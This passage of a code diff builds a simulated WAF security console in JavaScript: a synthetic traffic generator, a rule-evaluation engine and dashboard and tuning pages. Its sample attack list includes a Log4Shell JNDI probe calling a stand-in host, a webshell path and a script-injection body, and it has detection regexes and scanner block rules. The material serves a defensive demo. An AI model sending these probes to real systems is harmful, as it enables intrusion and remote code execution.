+  { rule:'TROJAN', method:'GET',  path:'/uploads/c99.php',                    note:'known webshell name' },
+  { rule:'PLAT',   method:'GET',  path:"/?x=${jndi:ldap://evil.tld/a}",       note:'Log4Shell probe' },
+  { rule:'OUTPUT', method:'GET',  path:'/api/v1/_diag',                       note:'stack trace exposed' }
+];
+
+const FP_CANDIDATES = [
+  // these look like attacks but are actually legitimate
+  { rule:'XSS', method:'POST', path:'/api/v1/notes', note:'markdown contains <strong>, treated as XSS', isFP: true },
+  { rule:'SQL', method:'GET',  path:"/api/v1/search?q=O'Brien",               note:"single quote in name", isFP: true },
+  { rule:'LFI', method:'GET',  path:'/api/v1/docs?p=../guide',                note:'relative path used by SPA', isFP: true }
+];
+
+function pickIp() { return IP_POOL[Math.floor(Math.random()*IP_POOL.length)]; }
+function pickCountry() {
+  const c = ['US','DE','UK','BR','RU','CN','KP','IR','IN','FR','NL','PL'];
+  return c[Math.floor(Math.random()*c.length)];
+}
+
+// Decision engine: given a generated event, what does the WAF do?
+function evaluateRequest(ev) {
+  // 1) Custom rules first (precedence: allow > deny)
+  for (const cr of STATE.customRules) {
+    if (cr.state !== 'active') continue;
+    if (cr.id === 'cr-2' && ev.ip.startsWith('10.40.')) {
+      cr.triggers++; ev.action='allow'; ev.matchedBy=`Custom: ${cr.name}`; return;
+    }
+    if (cr.id === 'cr-1' && /sqlmap|nikto|nuclei|wpscan/.test(ev.ua)) {
+      cr.triggers++; ev.action='deny'; ev.matchedBy=`Custom: ${cr.name}`; return;
+    }
+    if (cr.id === 'cr-3' && ['KP','IR','SY'].includes(ev.country)) {
+      cr.triggers++; ev.action='deny'; ev.matchedBy=`Custom: ${cr.name}`; return;
+    }
+  }
+  // 2) Rate rules (probabilistic — simulate threshold hits)
+  for (const rl of STATE.rateRules) {
+    if (rl.state !== 'active') continue;
+    if (rl.id==='rl-1' && ev.path.startsWith('/api/v1/auth/login') && Math.random() < 0.06) {
+      rl.triggers++; ev.action = rl.action; ev.matchedBy = `Rate: ${rl.name}`; return;
+    }
+  }
+  // 3) WAF attack signature?
+  if (ev.attackRule) {
+    const grp = STATE.attackGroups.find(g => g.id === ev.attackRule);
+    if (!grp) { ev.action = 'allow'; ev.matchedBy = '—'; return; }
+
+    // Exception check: did the user configure to exclude this combo?
+    const excepted = STATE.exceptions.some(ex => {
+      if (ex.ruleId !== grp.id) return false;
+      // simple match against criterion string
+      const m = ex.criterion.match(/(GET|POST|PUT|DELETE)\s+(.+?)(?:\s|$)/);
+      if (!m) return false;
+      return ev.method === m[1] && ev.path.startsWith(m[2].split(' ')[0]);
+    });
+
+    if (excepted) {
+      ev.action='allow'; ev.matchedBy = `${grp.name} (excepted)`; return;
+    }
+
+    // Sensitivity check: higher sensitivity = more likely to fire even on weak matches
+    // For FP candidates, sensitivity must be quite high (>= 7) to trigger
+    if (ev.isFP) {
+      if (grp.sens >= 7) {
+        grp.triggers++; grp.fp++;
+        STATE.metrics.falsePositives++;
+        ev.action = grp.action;
+        ev.matchedBy = `${grp.name} (likely FP)`;
+        return;
+      } else {
+        ev.action = 'allow'; ev.matchedBy = `—`; return;
+      }
+    }
+    // Real attack: triggers if sensitivity > 3
+    if (grp.sens >= 3) {
+      grp.triggers++;
+      ev.action = grp.action;
+      ev.matchedBy = grp.name;
+      return;
+    }
+  }
+  ev.action = 'allow';
+  ev.matchedBy = '—';
+}
+
+function generateEvent() {
+  let ev;
+  const roll = Math.random();
+  if (roll < 0.06) {
+    // attack
+    const a = ATTACKS[Math.floor(Math.random()*ATTACKS.length)];
+    ev = { method:a.method, path:a.path, attackRule:a.rule, note:a.note };
+  } else if (roll < 0.10) {
+    // false positive candidate
+    const f = FP_CANDIDATES[Math.floor(Math.random()*FP_CANDIDATES.length)];
+    ev = { method:f.method, path:f.path, attackRule:f.rule, note:f.note, isFP:true };
+  } else {
+    const [m,p] = PATHS_BENIGN[Math.floor(Math.random()*PATHS_BENIGN.length)];
+    ev = { method:m, path:p, attackRule:null };
+  }
+  ev.time = now();
+  ev.ip = pickIp();
+  ev.country = pickCountry();
+  ev.ua = Math.random() < 0.04
+    ? ['sqlmap/1.6.4','nikto/2.5','nuclei/v2','wpscan/3.8'][Math.floor(Math.random()*4)]
+    : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36';
+  ev.status = 200;
+  evaluateRequest(ev);
+
+  if (ev.action === 'deny') { ev.status = 403; STATE.metrics.totalBlocked++; }
+  else if (ev.action === 'alert') { STATE.metrics.totalAlerts++; }
+  STATE.metrics.totalReq++;
+
+  STATE.feed.unshift(ev);
+  if (STATE.feed.length > 60) STATE.feed.pop();
+
+  // spark history (rolls each tick)
+  STATE.metrics.sparkHist.shift();
+  STATE.metrics.sparkHist.push(
+    Math.max(0, (ev.action !== 'allow' ? 1 : 0) +
+      Math.floor(Math.random()*3))
+  );
+}
+
+let ticker = null;
+function startSim() {
+  if (ticker) return;
+  ticker = setInterval(() => {
+    if (STATE.feedPaused) return;
+    const burst = 1 + Math.floor(Math.random()*3);
+    for (let i=0;i<burst;i++) generateEvent();
+    refreshSimViews();
+  }, 700);
+}
+
+function refreshSimViews() {
+  // update only data-bound pieces; keep page chrome intact
+  updateBadges();
+  if (STATE.page === 'dashboard') {
+    updateDashboardData();
+  } else if (STATE.page === 'tuning') {
+    updateTuningCounts();
+  } else if (STATE.page === 'rate') {
+    updateRateCounts();
+  } else if (STATE.page === 'custom') {
+    updateCustomCounts();
+  }
+}
+
+/* =============================================================
+   NAV + ROUTING
+   ============================================================= */
+function navigate(page) {
+  STATE.page = page;
+  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.page === page));
+  const titles = {
+    dashboard: 'Dashboard', tuning:'Alert Tuning', waf:'WAF Rules',
+    rate:'Rate Controls', custom:'Custom Rules', bots:'Bot Manager',
+    reports:'Reports', adaptive:'Adaptive Engine',
+    settings:'Match Targets', history:'Version History'
+  };
+  $('#crumbHere').textContent = titles[page] || page;
+  renderPage();
+}
+
+document.addEventListener('click', (e) => {
+  const item = e.target.closest('.nav-item');
+  if (item && item.dataset.page) navigate(item.dataset.page);
+});
+
+$('#envPill').addEventListener('click', () => {
+  STATE.env = STATE.env === 'staging' ? 'production' : 'staging';
+  const pill = $('#envPill');
+  pill.classList.toggle('prod', STATE.env === 'production');
+  $('#envLabel').textContent = STATE.env === 'staging' ? 'STAGING · v17' : 'PRODUCTION · v16';
+  toast('Environment switched', `Now viewing ${STATE.env.toUpperCase()}`, 'info');
+});
+
+/* =============================================================
+   TOASTS
+   ============================================================= */
+function toast(title, body, kind='ok') {
+  const id = Math.random().toString(36).slice(2);
+  const el = document.createElement('div');
+  el.className = 'toast ' + kind;
+  el.innerHTML = `<div class="t-title">${title}</div><div class="t-body">${body || ''}</div>`;
+  $('#toasts').appendChild(el);
+  setTimeout(() => { el.style.transition='opacity 0.3s'; el.style.opacity=0; setTimeout(()=>el.remove(),300); }, 3800);
+}
+
+function updateBadges() {
+  const tuneCount = STATE.attackGroups.filter(g => g.triggers > 0).length;
+  $('#navTuneCount').textContent = tuneCount;
+  $('#navTuneCount').style.display = tuneCount ? 'inline-block' : 'none';
+}
+
+/* =============================================================
+   PAGE RENDERERS
+   ============================================================= */
+function renderPage() {
+  const main = $('#main');
+  switch(STATE.page) {
+    case 'dashboard': main.innerHTML = renderDashboard(); break;
+    case 'tuning':    main.innerHTML = renderTuning(); break;
+    case 'waf':       main.innerHTML = renderWAF(); break;
+    case 'rate':      main.innerHTML = renderRate(); break;
+    case 'custom':    main.innerHTML = renderCustom(); break;
+    case 'bots':      main.innerHTML = renderBots(); break;
+    case 'reports':   main.innerHTML = renderReports(); break;
+    case 'adaptive':  main.innerHTML = renderAdaptive(); break;
+    case 'settings':  main.innerHTML = renderSettings(); break;
+    case 'history':   main.innerHTML = renderHistory(); break;
+    default: main.innerHTML = renderDashboard();
+  }
+  // attach event handlers per page
+  if (STATE.page === 'tuning') wireTuning();
+  if (STATE.page === 'rate') wireRate();
+  if (STATE.page === 'custom') wireCustom();
+  if (STATE.page === 'bots') wireBots();
+  if (STATE.page === 'adaptive') wireAdaptive();
+}
+
+/* ----- Dashboard ----- */
+function renderDashboard() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Security Dashboard</h1>
+        <div class="page-sub">Real-time view across all match targets · last 60 minutes</div>
+      </div>
+      <div class="btn-row">
+        <button class="btn ghost" onclick="STATE.feedPaused = !STATE.feedPaused; toast(STATE.feedPaused?'Feed paused':'Feed resumed','','info');">⏸ Pause feed</button>
+        <button class="btn ghost">Export · CSV</button>
+      </div>
+    </div>
+
+    <div class="config-banner">
+      <div><span class="blink"></span> Security config: <b>${STATE.config}</b> · 4 match targets · 1 hostname (<span class="mono">www.akamai-corp.example</span>)</div>
+      <div class="small text-2">Last activation: 2026-05-11 14:22 UTC by sec-eng@</div>
+    </div>
+
+    <div class="stat-grid" id="statGrid">
+      ${renderStats()}
+    </div>
+
+    <div class="dash-grid">
+      <div class="card">
+        <div class="card-head">
+          <div class="card-title">◉ Live Traffic</div>
+          <div class="small text-2"><span class="blink"></span> streaming · click a row to inspect</div>
+        </div>
+        <div class="feed-scroll" id="feedScroll">
+          ${renderFeed()}
+        </div>
+      </div>
+
+      <div>
+        <div class="card mb12">
+          <div class="card-head"><div class="card-title">Top Attack Groups</div></div>
+          <div class="attack-list" id="attackList">
+            ${renderAttackList()}
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-head"><div class="card-title">Requests / sec</div></div>
+          <div class="card-body" style="padding:8px 12px;">
+            ${renderSpark()}
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+}
+
+function renderStats() {
+  const m = STATE.metrics;
+  return `
+    <div class="stat">
+      <div class="label">Total Requests</div>
+      <div class="value mono">${fmt(m.totalReq)}</div>
+      <div class="delta down">▲ 2.4% vs 1h avg</div>
+    </div>
+    <div class="stat">
+      <div class="label">Blocked</div>
+      <div class="value mono" style="color:var(--danger)">${fmt(m.totalBlocked)}</div>
+      <div class="delta up">${m.totalReq?((m.totalBlocked/m.totalReq*100).toFixed(2)):'0.00'}% of traffic</div>
+    </div>
+    <div class="stat">
+      <div class="label">Alerts</div>
+      <div class="value mono" style="color:var(--warn)">${fmt(m.totalAlerts)}</div>
+      <div class="delta">${m.totalReq?((m.totalAlerts/m.totalReq*100).toFixed(2)):'0.00'}%</div>
+    </div>
+    <div class="stat">
+      <div class="label">Likely False+</div>
+      <div class="value mono" style="color:var(--info)">${fmt(m.falsePositives)}</div>
+      <div class="delta down">Review in Alert Tuning</div>
+    </div>
+  `;
+}
+
+function renderFeed() {
+  if (!STATE.feed.length) return `<div style="padding:24px;color:var(--text-2)">Waiting for traffic…</div>`;
+  return STATE.feed.map((ev, i) => `
+    <div class="feed-row" data-idx="${i}" onclick="inspectReq(${i})">
+      <span class="feed-time">${ev.time.slice(0,8)}</span>
+      <span class="feed-method ${ev.method}">${ev.method}</span>
+      <span class="feed-ip">${ev.ip}</span>
+      <span class="feed-path" title="${ev.path}">${ev.path}</span>
+      <span class="feed-rule">${ev.matchedBy}</span>
+      <span class="feed-action ${ev.action}">${ev.action.toUpperCase()}</span>
+    </div>
+  `).join('');
+}
+
+function renderAttackList() {
+  const sorted = [...STATE.attackGroups].sort((a,b)=>b.triggers-a.triggers).slice(0,6);
+  const max = Math.max(1, ...sorted.map(s=>s.triggers));
+  return sorted.map(g => `
+    <div class="row">
+      <div class="name">${g.name}</div>
+      <div class="count">${fmt(g.triggers)}</div>
+      <div class="bar-wrap"><div class="bar-fill" style="width:${(g.triggers/max*100).toFixed(0)}%"></div></div>
+    </div>
+  `).join('');
+}
+
+function renderSpark() {
+  const data = STATE.metrics.sparkHist;
+  const max = Math.max(1, ...data);
+  const W = 360, H = 140, P = 8;
+  const step = (W - P*2) / (data.length - 1);
+  const pts = data.map((v,i) => `${P+i*step},${H-P - (v/max)*(H-P*2)}`).join(' ');
+  const area = `M${P},${H-P} L${pts.split(' ').join(' L')} L${W-P},${H-P} Z`;
+  return `
+    <svg class="chart-svg" viewBox="0 0 ${W} ${H}" preserveAspectRatio="none">
+      <line class="chart-grid" x1="${P}" y1="${H/2}" x2="${W-P}" y2="${H/2}" />
+      <line class="chart-axis" x1="${P}" y1="${H-P}" x2="${W-P}" y2="${H-P}" />
+      <path class="chart-area" d="${area}" />
+      <polyline class="chart-line" points="${pts}" />
+    </svg>
+  `;
+}
+
+function updateDashboardData() {
+  const sg = $('#statGrid'); if (sg) sg.innerHTML = renderStats();
+  const fs = $('#feedScroll'); if (fs) fs.innerHTML = renderFeed();
+  const al = $('#attackList'); if (al) al.innerHTML = renderAttackList();
+  const spark = document.querySelector('.chart-svg'); if (spark) spark.outerHTML = renderSpark();
+}
+
+/* ----- Inspect drawer ----- */
+function inspectReq(idx) {
+  const ev = STATE.feed[idx]; if (!ev) return;
+  STATE.selectedRequest = ev;
+  const o = $('#overlay');
+  // build highlighted request
+  let highlightedPath = ev.path;
+  if (ev.attackRule) {
+    // highlight any attacky substring
+    const pats = [/'/, /<script[^>]*>/i, /UNION SELECT/i, /etc\/passwd/i, /jndi:/i, /\.\.\//g, /onerror=/i, /;/g];
+    pats.forEach(p => {
+      highlightedPath = highlightedPath.replace(p, (m) => `<span class="hl">${m}</span>`);
+    });
+  }
+  const grp = ev.attackRule ? STATE.attackGroups.find(g=>g.id===ev.attackRule) : null;
+
+  o.innerHTML = `
+    <div class="drawer-backdrop" onclick="closeDrawer()"></div>
+    <div class="drawer">
+      <div class="drawer-head">
+        <div>
+          <div style="font-size:11px;color:var(--text-2);text-transform:uppercase;letter-spacing:0.06em;">Request inspector</div>
+          <div style="font-family:'Space Grotesk';font-weight:600;font-size:16px;margin-top:2px;">
+            ${ev.method} ${ev.path.length > 40 ? ev.path.slice(0,40)+'…' : ev.path}
+          </div>
+        </div>
+        <button class="btn ghost sm" onclick="closeDrawer()">Close ✕</button>
+      </div>
+      <div class="drawer-body">
+        <div class="row-flex mb12">
+          <span class="pill ${ev.action}">${ev.action}</span>
+          ${grp ? `<span class="pill ${grp.severity === 'critical' ? 'deny' : grp.severity === 'high' ? 'alert' : 'monitor'}">${grp.severity}</span>` : ''}
+          <span class="small text-2">${ev.time}</span>
+        </div>
+
+        <div class="field">
+          <div class="field-label">Source IP / Country / UA</div>
+          <div class="field-value">${ev.ip} · ${ev.country} · ${ev.ua}</div>
+        </div>
+
+        <div class="field">
+          <div class="field-label">Matched by</div>
+          <div class="field-value">${ev.matchedBy}</div>
+        </div>
+
+        <div class="field">
+          <div class="field-label">Reason</div>
+          <div class="field-value">${ev.note || '—'}</div>
+        </div>
+
+        <div class="field">
+          <div class="field-label">Raw request (decoded)</div>
+          <div class="req-block">${ev.method} ${highlightedPath} HTTP/1.1
+Host: www.akamai-corp.example
+User-Agent: ${ev.ua}
+Accept: */*
+X-Forwarded-For: ${ev.ip}
+${ev.method === 'POST' ? `\nContent-Type: application/json\n{ "id": 91, "content": "<script>fetch('/admin')<\/script>" }` : ''}</div>
+        </div>
+
+        ${grp ? `
+        <div class="mt16">
+          <div class="card-title mb8" style="text-transform:uppercase;font-size:11px;color:var(--text-2);letter-spacing:0.08em;">Quick actions</div>
+          <div class="btn-row">
+            <button class="btn primary" onclick="addExceptionForCurrent()">+ Add exception</button>
+            <button class="btn" onclick="changeRuleAction('${grp.id}','deny')">Action → Deny</button>
+            <button class="btn" onclick="changeRuleAction('${grp.id}','none')">Disable rule</button>
+            <button class="btn danger" onclick="penaltyBox('${ev.ip}')">Penalty Box IP</button>
+          </div>
+        </div>` : ''}
+      </div>
+    </div>
+  `;
+}
+function closeDrawer() { $('#overlay').innerHTML = ''; }
+
+function addExceptionForCurrent() {
+  const ev = STATE.selectedRequest; if (!ev || !ev.attackRule) return;
+  STATE.exceptions.push({
+    ruleId: ev.attackRule,
+    criterion: `${ev.method} ${ev.path.split('?')[0]}`,
+    pattern: 'auto from inspector'
+  });
+  STATE.pendingChanges++;
+  toast('Exception created', `${ev.attackRule}: ${ev.method} ${ev.path.split('?')[0]}`, 'ok');
+  closeDrawer();
+}
+function changeRuleAction(id, action) {
+  const g = STATE.attackGroups.find(g=>g.id===id);
+  if (!g) return;
+  g.action = action;
+  STATE.pendingChanges++;
+  toast('Rule action updated', `${g.name} → ${action.toUpperCase()}`, 'ok');
+  closeDrawer();
+}
+function penaltyBox(ip) {
+  toast('Penalty Box engaged', `${ip} blocked for 15 minutes`, 'warn');
+  closeDrawer();
+}
+
+/* ----- Alert Tuning ----- */
+function renderTuning() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Alert Tuning</h1>
+        <div class="page-sub">Review triggered rules, adjust sensitivity, set actions, and add exceptions for false positives.</div>
+      </div>
+      <div class="btn-row">
+        <button class="btn ghost">Reset to defaults</button>
+        <button class="btn primary" onclick="openActivate()">Save &amp; Activate</button>
+      </div>
+    </div>
+
+    <div class="tuning-grid">
+      <div>
+        <div class="card-title mb8" style="font-size:11px;letter-spacing:0.08em;text-transform:uppercase;color:var(--text-2);">Attack Groups · ${STATE.attackGroups.length}</div>
+        <div id="ruleList">
+          ${STATE.attackGroups.map(g => renderRuleCard(g)).join('')}
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-head">
+            <div class="card-title">※ Adaptive Recommendations</div>
+            <span class="small text-2">${STATE.recommendations.filter(r=>!r.applied).length} pending</span>
+          </div>
+          <div class="rec-panel">
+            ${STATE.recommendations.map(r => `
+              <div class="rec-item ${r.kind}">
+                <div class="head">${r.applied ? '✓' : (r.kind==='warn'?'⚠':'ⓘ')} ${r.title}</div>
+                <div class="body">${r.body}</div>
+                ${r.applied
+                  ? `<div class="applied">Applied to staging config</div>`
+                  : `<div class="btn-row"><button class="btn primary sm" onclick="applyRec('${r.id}')">Apply</button><button class="btn ghost sm">Dismiss</button></div>`
+                }
+              </div>
+            `).join('')}
+          </div>
+        </div>
+
+        <div class="card mt12">
+          <div class="card-head"><div class="card-title">⊕ Active Exceptions</div></div>
+          <div style="padding:8px 0;" id="exceptList">
+            ${renderExceptionList()}
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>`;
+}
+
+function renderRuleCard(g) {
+  return `
+    <div class="rule-card" data-rule="${g.id}">
+      <div class="rule-head" onclick="toggleRule('${g.id}')">
+        <div class="rule-severity ${g.severity}"></div>
+        <div>
+          <div class="rule-name">${g.name}</div>
+          <div class="rule-meta">${g.id}-* · severity: ${g.severity}</div>
+        </div>
+        <div class="triggers ${g.triggers > 20 ? 'hot':''}">${fmt(g.triggers)} triggers</div>
+        <select class="action-select" onchange="setRuleAction('${g.id}', this.value)" onclick="event.stopPropagation()">
+          <option value="alert" ${g.action==='alert'?'selected':''}>Alert</option>
+          <option value="deny"  ${g.action==='deny' ?'selected':''}>Deny</option>
+          <option value="none"  ${g.action==='none' ?'selected':''}>None</option>
+        </select>
+        <span style="color:var(--text-2);">▾</span>
+      </div>
+      <div class="rule-detail" style="display:none;">
+        <div class="rule-detail-grid">
+          <div>
+            <div class="field">
+              <div class="field-label">Description</div>
+              <div style="color:var(--text-1);font-size:12px;">${g.desc}</div>
+            </div>
+            <div class="field">
+              <div class="field-label">Sensitivity (1–10)</div>
+              <div class="sens-wrap">
+                <input type="range" min="1" max="10" value="${g.sens}" class="sens-slider"
+                       oninput="setSensitivity('${g.id}', this.value)"/>
+                <span class="sens-val" id="sens-${g.id}">${g.sens}</span>
+              </div>
+              <div class="small text-2 mt8">Higher = more aggressive matching. Lower if seeing false positives.</div>
+            </div>
+          </div>
+          <div>
+            <div class="field">
+              <div class="field-label">False positives flagged</div>
+              <div class="field-value" style="color:var(--info)">${fmt(g.fp)}</div>
+            </div>
+            <div class="exception-block">
+              <div class="title">+ Add exception</div>
+              <input class="input mb8" id="exc-cond-${g.id}" placeholder="e.g. POST /api/v1/notes" />
+              <input class="input mb8" id="exc-note-${g.id}" placeholder="Reason / pattern (optional)" />
+              <button class="btn primary sm" onclick="addException('${g.id}')">Save exception</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function renderExceptionList() {
+  if (!STATE.exceptions.length)
+    return `<div style="padding:14px 16px;color:var(--text-2);font-size:12px;">No exceptions yet. Add one from a rule card or from the request inspector.</div>`;
+  return STATE.exceptions.map((ex, i) => `
+    <div style="padding:10px 16px;border-bottom:1px solid var(--line);font-size:12px;display:flex;justify-content:space-between;align-items:center;">
+      <div>
+        <div style="font-weight:500;">${ex.ruleId}</div>
+        <div class="small text-2 mono">${ex.criterion} — ${ex.pattern}</div>
+      </div>
+      <button class="btn ghost sm" onclick="removeException(${i})">Remove</button>
+    </div>
+  `).join('');
+}
+
+function wireTuning() { /* delegated via inline handlers */ }
+
+function toggleRule(id) {
+  const card = document.querySelector(`.rule-card[data-rule="${id}"]`);
+  const detail = card.querySelector('.rule-detail');
+  const open = detail.style.display === 'block';
+  detail.style.display = open ? 'none' : 'block';
+  card.classList.toggle('expanded', !open);
+}
+function setRuleAction(id, val) {
+  const g = STATE.attackGroups.find(g=>g.id===id);
+  g.action = val;
+  STATE.pendingChanges++;
+  toast('Rule action updated', `${g.name} → ${val.toUpperCase()}`, 'ok');
+}
+function setSensitivity(id, val) {
+  const g = STATE.attackGroups.find(g=>g.id===id);
+  g.sens = parseInt(val);
+  document.getElementById('sens-'+id).textContent = val;
+  STATE.pendingChanges++;
+}
+function addException(id) {
+  const cond = document.getElementById('exc-cond-'+id).value.trim();
+  const note = document.getElementById('exc-note-'+id).value.trim();
+  if (!cond) { toast('Missing criterion', 'Enter a match criterion (e.g. POST /api/v1/notes)', 'warn'); return; }
+  STATE.exceptions.push({ ruleId:id, criterion:cond, pattern: note || 'manual' });
+  STATE.pendingChanges++;
+  toast('Exception added', `${id}: ${cond}`, 'ok');
+  document.getElementById('exceptList').innerHTML = renderExceptionList();
+  document.getElementById('exc-cond-'+id).value = '';
+  document.getElementById('exc-note-'+id).value = '';
+}
+function removeException(i) {
+  STATE.exceptions.splice(i,1);
+  document.getElementById('exceptList').innerHTML = renderExceptionList();
+  toast('Exception removed','','info');
+}
+function applyRec(id) {
+  const r = STATE.recommendations.find(r=>r.id===id);
+  if (!r || r.applied) return;
+  r.applied = true;
+  r.apply();
+  STATE.pendingChanges++;
+  renderPage(); // re-render to reflect
+}
+
+function updateTuningCounts() {
+  STATE.attackGroups.forEach(g => {
+    const card = document.querySelector(`.rule-card[data-rule="${g.id}"]`);
+    if (!card) return;
+    const triggers = card.querySelector('.triggers');
+    if (triggers) {
+      triggers.textContent = `${fmt(g.triggers)} triggers`;
+      triggers.classList.toggle('hot', g.triggers > 20);
+    }
+  });
+}
+
+/* ----- WAF Rules ----- */
+function renderWAF() {
+  const sigs = [
+    { id:'942100', group:'SQL', name:'SQL Injection Attack: Common Injection Testing Detected', vers:'KRS-3.3', mode:'enabled' },
+    { id:'942110', group:'SQL', name:'SQL Tautology', vers:'KRS-3.3', mode:'enabled' },
+    { id:'941100', group:'XSS', name:'Cross-Site Scripting (XSS) Attack Detected via libinjection', vers:'KRS-3.3', mode:'enabled' },
+    { id:'941160', group:'XSS', name:'NoScript XSS InjectionChecker: HTML Injection', vers:'KRS-3.3', mode:'enabled' },
+    { id:'932100', group:'CMDI', name:'Remote Command Execution: Unix Command Injection', vers:'KRS-3.3', mode:'enabled' },
+    { id:'930110', group:'LFI', name:'Path Traversal Attack (/../)', vers:'KRS-3.3', mode:'enabled' },
+    { id:'931100', group:'RFI', name:'Possible Remote File Inclusion (RFI) Attack', vers:'KRS-3.3', mode:'enabled' },
+    { id:'944100', group:'PLAT', name:'Remote Command Execution: Suspicious Java class (Log4j JNDI)', vers:'KRS-3.3', mode:'enabled' },
+    { id:'920170', group:'PROTO', name:'GET or HEAD Request with Body Content', vers:'KRS-3.3', mode:'disabled' }
+  ];
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">WAF Rules</h1>
+        <div class="page-sub">Kona Rule Set <b style="color:var(--accent)">KRS-3.3</b> · ${sigs.length} signatures shown · auto-update enabled</div>
+      </div>
+      <button class="btn ghost">Toggle auto-update</button>
+    </div>
+    <div class="card">
+      <table class="table">
+        <thead>
+          <tr>
+            <th style="width:90px;">RULE ID</th>
+            <th style="width:90px;">GROUP</th>
+            <th>NAME</th>
+            <th style="width:100px;">VERSION</th>
+            <th style="width:100px;">STATE</th>
+            <th style="width:120px;">ACTION</th>
+          </tr>
+        </thead>
+        <tbody>
+        ${sigs.map(s => {
+          const grp = STATE.attackGroups.find(g => g.id === s.group);
+          return `<tr>
+            <td class="mono">${s.id}</td>
+            <td><span class="pill ${grp?.severity==='critical'?'deny':grp?.severity==='high'?'alert':'monitor'}">${s.group}</span></td>
+            <td>${s.name}</td>
+            <td class="mono small text-2">${s.vers}</td>
+            <td><span class="pill ${s.mode==='enabled'?'active':'none'}">${s.mode}</span></td>
+            <td><span class="pill ${grp?.action||'alert'}">${(grp?.action||'alert').toUpperCase()}</span></td>
+          </tr>`;
+        }).join('')}
+        </tbody>
+      </table>
+    </div>
+    <div class="small text-2 mt12">Rules are managed at the group level on the <b style="color:var(--accent)">Alert Tuning</b> page. Individual signatures can be overridden if Adaptive Security Engine flags them.</div>
+  </div>
+  `;
+}
+
+/* ----- Rate Controls ----- */
+function renderRate() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Rate Controls</h1>
+        <div class="page-sub">Throttle or block clients that exceed request thresholds.</div>
+      </div>
+      <button class="btn primary" onclick="addRateRule()">+ New rate policy</button>
+    </div>
+    <div class="card">
+      <table class="table" id="rateTable">
+        <thead><tr>
+          <th>POLICY</th><th>MATCH</th><th>THRESHOLD</th><th>WINDOW</th>
+          <th>ACTION</th><th>STATE</th><th>TRIGGERED</th><th></th>
+        </tr></thead>
+        <tbody>
+        ${STATE.rateRules.map(r => `
+          <tr data-rate="${r.id}">
+            <td><b>${r.name}</b></td>
+            <td class="mono">${r.match}</td>
+            <td><input class="input" style="width:80px;" value="${r.threshold}" onchange="rateField('${r.id}','threshold',this.value)"/></td>
+            <td><input class="input" style="width:80px;" value="${r.window}" onchange="rateField('${r.id}','window',this.value)"/> s</td>
+            <td>
+              <select class="action-select" onchange="rateField('${r.id}','action',this.value)">
+                <option value="alert"  ${r.action==='alert' ?'selected':''}>Alert</option>
+                <option value="deny"   ${r.action==='deny'  ?'selected':''}>Deny</option>
+                <option value="delay"  ${r.action==='delay' ?'selected':''}>Slow</option>
+              </select>
+            </td>
+            <td><span class="pill ${r.state==='active'?'active':'none'}">${r.state}</span></td>
+            <td class="mono" data-triggers="${r.id}">${fmt(r.triggers)}</td>
+            <td><button class="btn ghost sm" onclick="toggleRate('${r.id}')">Toggle</button></td>
+          </tr>
+        `).join('')}
+        </tbody>
+      </table>
+    </div>
+  </div>
+  `;
+}
+function wireRate() {}
+function rateField(id, field, val) {
+  const r = STATE.rateRules.find(r=>r.id===id);
+  if (!r) return;
+  r[field] = (field === 'threshold' || field === 'window') ? parseInt(val) : val;
+  STATE.pendingChanges++;
+  toast('Rate policy updated', `${r.name}: ${field} → ${val}`, 'ok');
+}
+function toggleRate(id) {
+  const r = STATE.rateRules.find(r=>r.id===id);
+  r.state = r.state === 'active' ? 'disabled' : 'active';
+  STATE.pendingChanges++;
+  renderPage();
+}
+function addRateRule() {
+  const id = 'rl-'+(STATE.rateRules.length+1);
+  STATE.rateRules.push({ id, name:'New Rate Policy', match:'/*', threshold:100, window:60, action:'alert', state:'active', triggers: 0 });
+  renderPage();
+  toast('Rate policy created', `${id}`, 'ok');
+}
+function updateRateCounts() {
+  STATE.rateRules.forEach(r => {
+    const td = document.querySelector(`td[data-triggers="${r.id}"]`);
+    if (td) td.textContent = fmt(r.triggers);
+  });
+}
+
+/* ----- Custom Rules ----- */
+function renderCustom() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
+        <h1 class="page-title">Custom Rules</h1>
+        <div class="page-sub">Match conditions you define, evaluated before WAF and rate rules.</div>
+      </div>
+      <button class="btn primary">+ New custom rule</button>
+    </div>
+    <div class="card">
+      <table class="table">
+        <thead><tr><th>NAME</th><th>CONDITION</th><th>ACTION</th><th>STATE</th><th>TRIGGERED</th></tr></thead>
+        <tbody>
+        ${STATE.customRules.map(r => `
+          <tr>
+            <td><b>${r.name}</b></td>
+            <td class="mono small">${r.condition}</td>
+            <td><span class="pill ${r.action==='allow'?'active':r.action==='deny'?'deny':'alert'}">${r.action.toUpperCase()}</span></td>
+            <td><span class="pill ${r.state==='active'?'active':'none'}">${r.state}</span></td>
+            <td class="mono" data-ctriggers="${r.id}">${fmt(r.triggers)}</td>
+          </tr>
+        `).join('')}
+        </tbody>
+      </table>
+    </div>
+    <div class="card mt12">
+      <div class="card-head"><div class="card-title">Rule Builder · preview</div></div>
+      <div class="card-body">
+        <div class="row-flex gap8 mb8">
+          <select class="action-select" style="min-width:140px;"><option>Match: ANY of</option><option>ALL of</option></select>
+          <input class="input" placeholder="condition (e.g. Header[User-Agent] matches X)" />
+          <button class="btn ghost sm">+ AND</button>
+        </div>
+        <div class="row-flex gap8">
+          <span class="small text-2">then</span>
+          <select class="action-select"><option>Deny</option><option>Alert</option><option>Allow</option></select>
+          <button class="btn primary sm">Save rule</button>
+        </div>
+      </div>
+    </div>
+  </div>`;
+}
+function wireCustom() {}
+function updateCustomCounts() {
+  STATE.customRules.forEach(r => {
+    const td = document.querySelector(`td[data-ctriggers="${r.id}"]`);
+    if (td) td.textContent = fmt(r.triggers);
+  });
+}
+
+/* ----- Bot Manager ----- */
+function renderBots() {
+  return `
+  <div class="page">
+    <div class="page-head">
+      <div>
